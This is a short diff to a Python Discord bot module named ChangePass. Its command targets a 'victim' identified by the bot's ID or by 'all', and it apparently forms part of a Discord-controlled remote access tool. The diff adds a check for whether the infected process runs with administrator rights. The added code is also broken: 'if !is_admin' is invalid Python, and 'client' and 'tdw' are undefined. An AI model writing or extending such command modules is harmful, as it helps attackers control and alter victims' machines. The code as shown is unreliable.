@@ -2,7 +2,7 @@ import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
 
-import os, requests
+import os, requests, ctypes
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 class ChangePass(commands.Cog):
@@ -20,8 +20,13 @@ class ChangePass(commands.Cog):
         """
         
         if str(victim) == str(self.bot.identifier) or str(victim).lower() == "all":
-            # wip
-
+            try:
+                is_admin = os.getuid() == 0
+            except AttributeError:
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+             
+            if !is_admin:
+                client.genEmbed(tdw)
 
 def setup(bot: commands.Bot):
     bot.add_cog(ChangePass(bot))
